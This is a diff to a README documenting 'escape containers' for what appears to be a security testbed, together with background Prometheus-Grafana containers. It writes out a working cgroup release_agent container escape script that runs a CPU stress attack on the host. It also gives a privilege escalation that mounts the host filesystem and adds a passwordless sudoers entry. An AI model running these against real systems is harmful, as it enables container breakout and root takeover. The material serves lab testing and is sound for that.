@@ -1,57 +1,77 @@
 # Escape Containers
 
+The directory has the containers that are used to launch a container escape and associated attack.  It also has other background containers.  The container escapes were derived from the following.
+
+https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/
+
+
 ## Denial of Service Container
-Describe how the escape containers were created.
 
-# Derived from https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/
+Get the latest ubuntu image
 
+```bash
+docker pull ubuntu
+```
 
-# Review overlay file system
-https://wvi.cz/diyC/images-containers/
-https://www.kernel.org/doc/html/latest/filesystems/overlayfs.html
-https://jvns.ca/blog/2019/11/18/how-containers-work--overlayfs/
-$ mkdir upper lower merged work
-$ echo "I'm from lower!" > lower/in_lower.txt
-$ echo "I'm from upper!" > upper/in_upper.txt
-$ # `in_both` is in both directories
-$ echo "I'm from lower!" > lower/in_both.txt
-$ echo "I'm from upper!" > upper/in_both.txt
-$ sudo mount -t overlay overly -o lowerdir=/home/pi/tmp/lower,upperdir=/home/pi/tmp/upper,workdir=/home/pi/tmp/work /home/pi/tmp/merged
+Using original ubuntu, install nano, add escape.sh, then commit
 
+```bash
+docker run --privileged --name=ESCAPE_A --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
+```
 
-#=================================================#
-# CONTAINER ESCAPE A
-#=================================================#
+From within container
 
-SYNERGIA: Got mount: /tmp/cgrp: wrong fs type, bad option, bad superblock on cgroup, missing codepage or helper program, or other error.
-SOLUTION: https://askubuntu.com/questions/525243/why-do-i-get-wrong-fs-type-bad-option-bad-superblock-error
+```bash
+apt-get update
+apt-get install nano
+nano escape.sh
+#!/usr/bin/bash
+...
+(save)
+chmod +x escape.sh
+```
 
+In another host terminal, saved current ubuntu to ubuntu_escape image.  The ubuntu_escape will have the escape.sh
 
-# On the host
-docker run --name ESCAPE_A --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
+```bash
+docker commit ESCAPE_A ubuntu_escape
+```
 
-# In the container, create escape.sh file with following
+You can now exit the ubuntu container.
 
+From a host terminal, start the ubuntu_escape container with reduced security.
+
+```bash
+docker run --name=ESCAPE_A --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu_escape bash
+```
+
+Finally, from other host terminal, execute escape.sh in ubuntu_escape.  This launches the attack (you can use top to see the increased CPU usage).  Note that [scenarioDos.py](./src/scenarioDos.py) uses this to launch the attack.
+```bash
+docker exec -it ESCAPE_A /escape.sh
+```
+
+### Escape
+
+In the container, create escape.sh file with following
+
+```bash
 #!/bin/sh
-date
 mkdir /tmp/cgrp
 mount -t cgroup -o memory cgroup_memory /tmp/cgrp
 mkdir /tmp/cgrp/x
-date
 echo 1 > /tmp/cgrp/x/notify_on_release
 host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
 echo "$host_path/cmd" > /tmp/cgrp/release_agent
-date
 cat stress.txt > /cmd
 chmod a+x /cmd
-date
 sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
-date
+```
 
-#=================================================#
-# CONTAINER ATTACK A
-#=================================================#
-# In the container, create stress.txt file with following
+### Attack
+
+In the container, create stress.txt file with following
+
+```bash
 #!/bin/bash
 stress() {
   (
@@ -65,62 +85,59 @@ stress() {
   )
 }
 stress 2 20
+```
 
+## Privilege Escalation Container
 
-#=================================================#
-# CONTAINER ESCAPE B
-#=================================================#
-# Create container from alpine image
+Create container from alpine image.
+
+### Escape
+
+The privilege escape is really accomplished by the mounting of a volume during container building.
+
+```
 FROM alpine
 ENV WORKDIR /privesc
 RUN mkdir -p $WORKDIR
 VOLUME $WORKDIR
 WORKDIR $WORKDIR
+```
 
-# Command to build container
+Execute the following command to build container.
+
+```bash
 docker build -t priv-container .
+```
 
+You can execute the following command to run the container.  Note that this is done in the [scenarioPrivesc.py](../src/scenarioPrivesc.py).
 
-# Command to run container, was /bin/bash
+```bash
 docker run --name ESCAPE_B -v /:/privesc -it priv-container /bin/sh
+```
 
-# Attack part 1
+### Attack
+
+The attack assumes a user testuer aleady exists that has password requires sudo privilege (the attack changes this to password-less).  From within the container, the following is executed.
+
+```bash
 echo "testuser ALL=(ALL) NOPASSWD: ALL" > /privesc/etc/sudoers.d/010_testuser-nopasswd
+```
 
 
+## Prometheus-Grafana Container
 
-#=================================================#
-# USEFUL DOCKER COMMANDS TO AUTOMATE ESCAPE
-# To install vim in docker, need to be privileged
-# docker run --privileged --name=ESCAPE_A --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
-# then in container # apt update
-#                   # apt install nano (vim hopeless)
-# Be sure to add as first line to script
-# #!/usr/bin/bash
-# Finally create escape.sh and be sure to make executable
-#                   # chmod +x escape.sh
-#=================================================#
-docker commit ESCAPE_A ubuntu_escape
+The prometheus-grafana container is take from awesome-compose and can be started and stopped with the following.  Note that this is done in the [scenarioGrafana.py](../src/scenarioGrafana.py).
 
-# Using original ubuntu, install nano, add escape.sh, then commit
-docker run --privileged --name=ESCAPE_A --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
-# From within container
-apt-get update
-apt-get install nano
-nano escape.sh
-#!/usr/bin/bash
-...
-(save)
-chmod +x escape.sh
+```bash
+sudo docker-compose -f prometheus-grafana/docker-compose.yml up --no-start
+sudo docker-compose -f prometheus-grafana/docker-compose.yml start
+```
 
-# In another host terminal, saved current ubuntu to ubuntu_escape image
-# The ubuntu_escape will have the escape.sh
-docker commit ESCAPE_A ubuntu_escape
-# You can now exit the ubuntu container
+```bash
+sudo docker-compose -f prometheus-grafana/docker-compose.yml stop
+sudo docker-compose -f prometheus-grafana/docker-compose.yml rm -f
+```
 
+## Internet of Things Container
 
-# Start the ubuntu_escape (do not need privileged)
-docker run --name=ESCAPE_A --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu_escape bash
-
-# Finally, from other host terminal, execute escape.sh in ubuntu_escape
-docker exec -it ESCAPE_A /escape.sh
+Need to add.
